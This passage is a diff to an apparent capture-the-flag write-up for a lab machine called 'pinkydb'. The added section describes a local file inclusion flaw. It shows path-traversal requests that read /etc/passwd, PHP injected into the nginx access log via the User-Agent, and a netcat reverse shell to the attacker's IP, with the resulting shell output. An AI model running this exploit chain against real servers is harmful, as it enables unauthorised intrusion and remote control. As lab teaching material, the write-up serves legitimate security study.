@@ -389,9 +389,50 @@ EHc/fHCThXM7op4q0MccCJPrhPIhwrM+dHasJGsmLlyy/Oe62c2Hx2Rh09xcU0JF
 
 Clearly these need to be used on the SSH port that was opened (Port# 4655).
 
+## LFI Vulnerability Remote Shell
+
+The key and note link also revealed a Local File Include (LFI) vulnerability in the pagegap.php file:
+```
+http://pinkydb:7654/pageegap.php?1337=
+```
+We are able to pull down the /etc/passwd file easily:
+```
+root@kali:~# curl http://pinkydb:7654/pageegap.php?1337=../../../../../../../etc/passwd
+root:x:0:0:root:/root:/bin/bash
+---SNIP---
+sshd:x:107:65534::/run/sshd:/usr/sbin/nologin
+demon:x:1001:1001::/home/demon:/bin/bash
+stefano:x:1002:1002::/home/stefano:/bin/bash
+```
+
+This can also be leveraged for a reverse shell under the www-data account if we inject PHP code into the access.log of nginx.
+First we will inject a reverse shell php command into the nginx access.log file:
+
+```
+curl -A "<?php echo 'SHELL'; shell_exec('nc -nv 192.168.225.129 222 -e /bin/bash');?>" http://pinkydb:7654/pageegap.php
+```
+
+Start our local listener:
+```
+nc -nlvp 222
+```
+
+Use the LFI to load the Nginx access.log file which will also execute the php code we embedded into the content:
+```
+curl http://pinkydb:7654/pageegap.php?1337=../../../../../../../var/log/nginx/access.log
+```
+
+Then we get our shell as the www-data user
+```
+listening on [any] 222 ...
+connect to [192.168.225.129] from (UNKNOWN) [192.168.225.130] 33596
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
 ## SSH with Stefano the Intern Web developer
 
-Okay, time to set the permissions correctly for id_rsa and try it against the server.
+Jumping back to the Stefano Intern web developer... time to set the permissions correctly for id_rsa and try it against the server.
 
 ```
 root@kali:~/Documents/Vanquish/pinkydb# chmod 600 id_rsa
